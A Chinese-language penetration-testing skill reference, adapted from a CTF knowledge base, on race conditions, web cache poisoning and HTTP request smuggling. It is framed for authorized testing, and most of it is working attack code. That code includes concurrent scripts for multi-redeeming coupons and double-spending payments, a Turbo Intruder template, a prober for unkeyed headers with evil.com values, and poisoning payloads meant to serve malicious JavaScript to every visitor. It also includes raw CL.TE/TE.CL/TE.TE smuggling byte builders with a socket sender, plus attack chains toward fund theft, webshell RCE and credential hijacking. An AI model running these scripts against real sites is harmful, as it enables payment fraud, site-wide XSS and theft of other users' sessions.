# Race Condition / Cache Poisoning / Request Smuggling

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/08-infra/race-cache-smuggling.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「race condition / cache poisoning / request smuggling / 条件竞争」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- race condition
- cache poisoning
- request smuggling
- 条件竞争
- 缓存投毒
- CL.TE
- TE.CL
- H2.CL

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. Race Condition
2. 竞态判定矩阵 — 竞态不要只看 HTTP 200 个数，必须看“持久化副作用”。同一批并发后立刻读状态，判断数据库层是否真的多扣、多发、多创建。
3. 支付/订单竞态账本 — 支付竞态要按账本打，不按响应码打。每一批并发都要把写请求、读状态、状态差、可复用 token 和数据库字段放到同一条 timeline 里，才能看出 lost update、double spend、重复发货、幂等 ke…
4. Turbo Intruder 并发模板
5. 经典竞态场景
6. Python 并发模板
7. Cache Poisoning
8. 探测 Unkeyed Headers
9. Cache Key 推断
10. 毒化 Payload
11. Request Smuggling
12. CL.TE vs TE.CL 探测
13. 原始字节差异矩阵
14. TE.TE 混淆

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **Evidence** — `race_batch.json`: 并发数、连接数、响应状态分布、响应长度集合、批次时间窗口。
- **Evidence** — `race_state_after.json`: 并发后的余额、订单、邀请码、文件状态等持久化结果。
- **Evidence** — `race_payment_ledger_timeline.csv`: 每个写请求、读状态、耗时、响应片段、订单/支付/钱包字段。
- **Evidence** — `cache_key_matrix.csv`: header/query/cookie 是否入 key、预热响应、复取响应、命中 header。
- **Evidence** — `smuggling_raw.bin`: CL.TE / TE.CL / TE.TE 原始 bytes，保留 CRLF 和长度字段。
- **Evidence** — 成功样本: HTTP 成功数与持久化状态同时变化；或 smuggling probe 造成下一请求延迟/串扰。
- **Evidence** — 失败样本: 只有表面 200 但状态只变一次；缓存全 MISS；前后端解析一致直接 400。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 1. Race Condition

### 竞态判定矩阵

竞态不要只看 HTTP 200 个数，必须看“持久化副作用”。同一批并发后立刻读状态，判断数据库层是否真的多扣、多发、多创建。

| 场景 | 触发请求 | 状态读取 | 成功标志 | 失败样本 |
|---|---|---|---|---|
| 优惠码 | `POST /redeem` | `GET /wallet` / `GET /orders` | 成功次数 > 1 且余额/订单累计 | 只有首个 200，余额只变一次 |
| 转账 | `POST /transfer` | `GET /balance` | 两笔以上入账或负余额 | 后端幂等 key 拦截 |
| 邀请码 | `POST /invite` | `GET /invites` | 同一账号产生多个可用 code | 返回重复 code 但只能用一次 |
| 邮箱验证 | `POST /verify` + `POST /login` | `GET /me` | `email_verified=true` 前可登录 | 登录态仍受 verify 字段限制 |
| 上传处理 | `POST /upload` + `GET /uploads/x` | 文件访问/包含 | 临时文件在扫描/重命名前可访问 | 只出现 404 或 pending |

```python
# race_oracle.py — 并发请求 + 状态读取
import concurrent.futures
import requests

def race_with_state(write_req, read_req, count=40, workers=20):
    """
    write_req/read_req:
      {"method": "POST", "url": "...", "headers": {...}, "json": {...}}
    """
    s = requests.Session()

    def send(req):
        return s.request(
            req.get("method", "GET"),
            req["url"],
            headers=req.get("headers"),
            json=req.get("json"),
            data=req.get("data"),
            timeout=10,
        )

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        results = list(ex.map(lambda _: send(write_req), range(count)))

    state = send(read_req)
    return {
        "status_counts": {c: sum(1 for r in results if r.status_code == c)
                          for c in sorted({r.status_code for r in results})},
        "lengths": sorted({len(r.text) for r in results}),
        "state_status": state.status_code,
        "state_preview": state.text[:500],
    }
```

### 1.1 支付/订单竞态账本

支付竞态要按账本打，不按响应码打。每一批并发都要把写请求、读状态、状态差、可复用 token 和数据库字段放到同一条 timeline 里，才能看出 lost update、double spend、重复发货、幂等 key 缺失。

| 业务动作 | 并发组合 | 读状态 | 成功标志 | 关联技巧 |
|---|---|---|---|---|
| 优惠券兑换 | `POST /coupon/redeem` x N | wallet、orders、coupon ledger | 同 code 多条入账或多单折扣 | rate limit bypass、IDOR |
| 钱包转账 | `POST /transfer` x N | balance、transaction list | 余额负数、收款多笔、流水不平 | SQL 事务隔离、整数/精度 |
| 订单取消/发货 | `POST /cancel` + `POST /ship` | order status、shipment、refund | `cancelled` 与 `shipped/refunded` 同时存在 | 状态机覆盖 |
| 支付回调 | 同一 `notify` 重放并发 | payments、entitlements、callback log | entitlement 多次发放 | signature replay、cache deception |
| 邀请/积分 | `POST /invite/claim` x N | points、invite ledger | 积分累计超过一次 | websocket broadcast |
| 上传/导入 | `POST /import` + `GET /result` | job status、SQL row count | 校验前结果可读、重复导入 | SQL injection、file race |

```python
# race_payment_ledger_timeline.py
import concurrent.futures
import csv
import json
import time
import requests

def send(session, req):
    return session.request(
        req.get("method", "GET"),
        req["url"],
        headers=req.get("headers"),
        json=req.get("json"),
        data=req.get("data"),
        timeout=10,
    )

def batch(write_reqs, read_reqs, count=40, workers=20, out_csv="exports/race_payment_ledger_timeline.csv"):
    s = requests.Session()
    timeline = []
    started = time.time()

    def fire(i):
        req = write_reqs[i % len(write_reqs)]
        t0 = time.time()
        r = send(s, req)
        return {
            "kind": "write",
            "idx": i,
            "url": req["url"],
            "status": r.status_code,
            "len": len(r.text),
            "body": r.text[:300],
            "dt_ms": int((time.time() - t0) * 1000),
        }

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        for row in ex.map(fire, range(count)):
            timeline.append(row)

    for name, req in read_reqs.items():
        r = send(s, req)
        timeline.append({
            "kind": "read",
            "idx": name,
            "url": req["url"],
            "status": r.status_code,
            "len": len(r.text),
            "body": r.text[:800],
            "dt_ms": int((time.time() - started) * 1000),
        })

    with open(out_csv, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["kind", "idx", "url", "status", "len", "body", "dt_ms"])
        w.writeheader()
        w.writerows(timeline)
    print(json.dumps({"writes": count, "reads": list(read_reqs), "out": out_csv}, ensure_ascii=False))

batch(
    [{"method": "POST", "url": "https://target/api/coupon/redeem", "json": {"code": "ONETIME"}}],
    {
        "wallet": {"url": "https://target/api/wallet"},
        "orders": {"url": "https://target/api/orders"},
        "ledger": {"url": "https://target/api/coupons/ledger"},
    },
)
```

判断顺序：先看 `exports/race_payment_ledger_timeline.csv` 中写请求时间窗，再看读状态里的 `balance`、`amount`、`orderStatus`、`transactionId`、`entitlement`。HTTP 200 多不代表成功；只有账本字段多发、多扣、错序或互相矛盾，才进入下一轮扩大并发、换幂等 key、叠加 WebSocket broadcast 或 cache deception 取证。

### Turbo Intruder 并发模板

```python
# race_turbo.py — Turbo Intruder 脚本 (粘贴到 Burp)
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,  # 并发连接数
        requestsPerConnection=100, # 每连接请求数
        pipeline=False
    )

    # 构造两个请求: 第一个改变状态，第二个在状态改变前也通过
    for i in range(50):
        engine.queue(target.req)   # 同时发出 50 个相同请求

def handleResponse(req, interesting):
    table.add(req)  # 每个响应都记录
```

### 经典竞态场景

```python
# 场景 1: 优惠券/优惠码多次使用
# POST /api/redeem {"code": "ONETIME-CODE"}
# → 并发 50 次 → 多次成功

# 场景 2: 钱包/余额转账
# POST /api/transfer {"to": "attacker", "amount": balance}
# → 并发转账 → 余额被负数扣除前已转走

# 场景 3: 邀请码
# POST /api/invite → 返回唯一邀请码
# → 并发请求 → 同一用户拿到多个邀请码

# 场景 4: 投票
# POST /api/vote {"target": "A"}
# → 并发投票 → 突破每人一票限制

# 场景 5: Reset Token 绕过
# POST /api/reset-password {"email": "victim@test.com"}
# 同时: POST /api/verify-token {"token": "GUESS"}
# → 旧的 token 还未失效，新的 token 已生成
```

### Python 并发模板

```python
# race.py — 通用 race condition 测试
import concurrent.futures, requests, time

def race_test(url: str, method='POST', headers=None, data=None, json=None,
              count: int = 50, max_workers: int = 20):
    """并发发送 count 个相同请求"""
    def send_one(_):
        if method == 'POST':
            return requests.post(url, headers=headers, data=data, json=json)
        return requests.get(url, headers=headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(send_one, i) for i in range(count)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    # 统计
    status_counts = {}
    for r in results:
        status_counts[r.status_code] = status_counts.get(r.status_code, 0) + 1
    return status_counts, results

# 使用
codes, _ = race_test("https://target.com/api/redeem",
    json={"code": "ONETIME-CODE"}, count=50)
print(codes)  # {200: 5, 400: 45} → 5 次成功 = race bug!
```

## 2. Cache Poisoning

### 探测 Unkeyed Headers

### Cache Key 推断

| 输入 | 如果入 cache key | 如果不入 cache key | 下一跳 |
|---|---|---|---|
| `X-Forwarded-Host` | 每个 host 都 MISS | 带 header 预热后无 header HIT 同正文 | 资源 URL / redirect 毒化 |
| `Origin` | 不同 Origin 独立缓存 | CORS 或反射内容被共享 | CORS + cache poisoning |
| `Cookie` | 每个 cookie 独立 | 个性化响应可被共享 | cache deception / session leak |
| `Accept-Encoding` | gzip/br 独立 | 压缩差异可污染 | compression side-channel |
| Query 参数 | `?x=1` 与 `?x=2` 分离 | query ignored | cache buster 失效 |

```python
# 找出 CDN cache key 不包含但后端处理的 header
import requests

def find_unkeyed_headers(target_url: str):
    """探测哪些 header 影响响应内容但不影响 cache key"""
    baseline = requests.get(target_url)
    cache_status_baseline = baseline.headers.get("X-Cache", "")

    CANDIDATES = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Scheme", "http"),
        ("X-Forwarded-Port", "80"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-HTTP-Method-Override", "PUT"),
        ("Forwarded", "for=evil.com"),
        ("Origin", "https://evil.com"),
        ("Referer", "https://evil.com"),
        ("User-Agent", "special-poison-test"),
    ]

    for header, value in CANDIDATES:
        r = requests.get(target_url, headers={header: value})
        # 检查是否被缓存
        if "hit" in r.headers.get("X-Cache", "").lower():
            # 如果能缓存且内容不同 → unkeyed header 可毒化
            if r.text != baseline.text:
                print(f"[!] Unkeyed: {header}: {value}")
                # 验证毒化效果
                r2 = requests.get(target_url)  # 不带 header 再请求
                if r2.text == r.text:
                    print(f"    [!] CACHE POISONED! {header}")

find_unkeyed_headers("https://target.com/home")
```

### 毒化 Payload

```python
# 通过 unkeyed header 注入恶意内容到缓存
POISON_PROBES = {
    # X-Forwarded-Host → 重定向/资源路径劫持
    "X-Forwarded-Host": "evil.com",
    # Host → 首页/绝对路径劫持
    "Host": "evil.com",
    # 协议降级 → 资源劫持
    "X-Forwarded-Scheme": "http",
    # 404/error 页面注入
    "X-Original-URL": "/nonexistent_xss_payload",
    # cookie 导致的差异化缓存
    "Cookie": "lang=../../../evil.com/xss",
}

# 实际 payload: 用 X-Forwarded-Host 让 CDN 缓存一个 redirect 到
# evil.com 的 JS → 所有后续用户都加载恶意 JS
```

## 3. Request Smuggling

### CL.TE vs TE.CL 探测

### 原始字节差异矩阵

| 类型 | 前端解析 | 后端解析 | 探测信号 | 失败样本 |
|---|---|---|---|---|
| CL.TE | 用 `Content-Length` | 用 `Transfer-Encoding` | 后端把残留字节当下一请求前缀 | 前端直接 400 |
| TE.CL | 用 `Transfer-Encoding` | 用 `Content-Length` | 下一请求被拼接或延迟响应 | 两端都按 TE 结束 |
| TE.TE | 一个接受混淆 TE | 一个忽略混淆 TE | header 大小写/空格导致分歧 | 两端规范化一致 |
| H2.CL | H2 前端按 frame | H1 后端按 CL | downgrade 后残留 body 进入队列 | 网关拒绝 H2 body/header |
| H2.TE | H2 前端忽略 TE | H1 后端接受 TE | 降级后 chunk 语义生效 | H2 层禁止 TE |

```python
# smuggling_payloads.py — 只生成原始 bytes，交给 nc/socket 发送
def cl_te(host):
    return (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\nG"
    ).encode()

def te_cl(host):
    return (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
        "5c\r\nGPOST / HTTP/1.1\r\nHost: x\r\n\r\n0\r\n\r\n"
    ).encode()

def te_te(host):
    variants = [
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
    ]
    return [(
        f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n{te}\r\n\r\n0\r\n\r\nG"
    ).encode() for te in variants]
```

```python
# 路径打通后记录缓存 key、命中 header 和响应差异
def probe_smuggling(target: str):
    """CL.TE / TE.CL 差异探测"""
    import socket, ssl

    def raw_request(host, port, use_tls, payload_bytes):
        sock = socket.socket()
        if use_tls:
            sock = ssl.wrap_socket(sock)
        sock.connect((host, port))
        sock.send(payload_bytes)
        return sock.recv(4096)

    host = target.replace("https://", "").replace("http://", "").split("/")[0]
    port = 443 if target.startswith("https") else 80
    use_tls = target.startswith("https")

    # CL.TE probe
    cl_te = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"G"  # 这个 G 如果被后端处理 → CL.TE
    )
    r = raw_request(host, port, use_tls, cl_te)
    if b"405" in r or b"Unrecognized" in r:
        print("[!] CL.TE Smuggling possible")
    else:
        print(f"[*] CL.TE result: {r.decode()[:200]}")

    # TE.CL probe
    te_cl = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"5c\r\n"  # 大 chunk
        b"GPOST / HTTP/1.1\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
    )
    r = raw_request(host, port, use_tls, te_cl)
    # 如果后端看到 GPOST → TE.CL
    if b"GPOST" in r or b"405" in r:
        print("[!] TE.CL Smuggling possible")
```

### TE.TE 混淆

```text
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
```

### H2.CL / H2.TE (HTTP/2)

```python
# HTTP/2 不支持 Transfer-Encoding，但支持 Content-Length
# 如果前端用 HTTP/2，后端用 HTTP/1.1 → 降级攻击

# H2.CL: HTTP/2 头部注入 Content-Length: 0
# 前端认为请求体为空
# 降级到 HTTP/1.1 后，后端看到 CL=0 → 后面的数据成新请求
```

---

## 4. 更多竞态场景

```python
# 场景 6: 文件上传 + 包含竞态
# 上传 webshell → 在上传完成但未重命名/杀毒前 → 立刻访问

# 场景 7: 注册邮箱验证
# 注册 → 发送验证邮件 → 在验证完成前登录 → 可能跳过验证

# 场景 8: 订单取消 vs 发货
# 两点: POST /cancel + GET /confirm 同时发 → 订单既被取消又发货

# 场景 9: 邀请制注册
# 无邀请码 → 并发请求 → 突破名额限制

# 场景 10: 密码重置
# POST /forgot (受害者) + POST /verify?token=ATTACKER_GUESS
# 新旧 token 同时有效窗口 → 竞态
```

## 5. Cache Poisoning 进阶

```python
# Fat GET: 带 body 的 GET 请求
# 某些 CDN 用 GET + headers 做 cache key, 但后端处理 body

# 响应拆分毒化
# X-Forwarded-Host: evil.com → 后端返回 redirect → CDN 缓存 redirect

# 路径混淆
# /home%0d%0aX-Injected:%20evil → URI 规范化差异
```

## 6. 攻击链

```
Race Condition → 并发兑换 → 多次成功 → 余额溢出
Race Condition → 并发转账 → 负余额 → 资金窃取
Race Condition → 上传+包含 → webshell 竞态 → RCE
Race Condition → 注册+验证 → 跳过邮箱验证 → 任意注册
Cache Poisoning → X-Forwarded-Host → JS 资源劫持 → 全站 XSS
Cache Poisoning → unkeyed cookie → 差异化缓存 → 定向攻击
CL.TE Smuggling → 请求走私 → 劫持后续用户请求 → 凭证窃取
CL.TE Smuggling → 绕过前端 ACL → 直接打后端 → Admin API
H2.CL Smuggling → HTTP/2 降级 → 注入请求 → 内网 SSRF
Race Condition → 支付 notify 并发 → entitlement 多发 → 订单状态机错位
Cache Poisoning + Host Header → 支付回调 URL 污染 → notify 进入攻击者控制链
Request Smuggling → 前端 ACL 绕过 → 后端订单/支付管理 API
```

## Evidence

- `race_batch.json`: 并发数、连接数、响应状态分布、响应长度集合、批次时间窗口。
- `race_state_after.json`: 并发后的余额、订单、邀请码、文件状态等持久化结果。
- `race_payment_ledger_timeline.csv`: 每个写请求、读状态、耗时、响应片段、订单/支付/钱包字段。
- `cache_key_matrix.csv`: header/query/cookie 是否入 key、预热响应、复取响应、命中 header。
- `smuggling_raw.bin`: CL.TE / TE.CL / TE.TE 原始 bytes，保留 CRLF 和长度字段。
- 成功样本: HTTP 成功数与持久化状态同时变化；或 smuggling probe 造成下一请求延迟/串扰。
- 失败样本: 只有表面 200 但状态只变一次；缓存全 MISS；前后端解析一致直接 400。
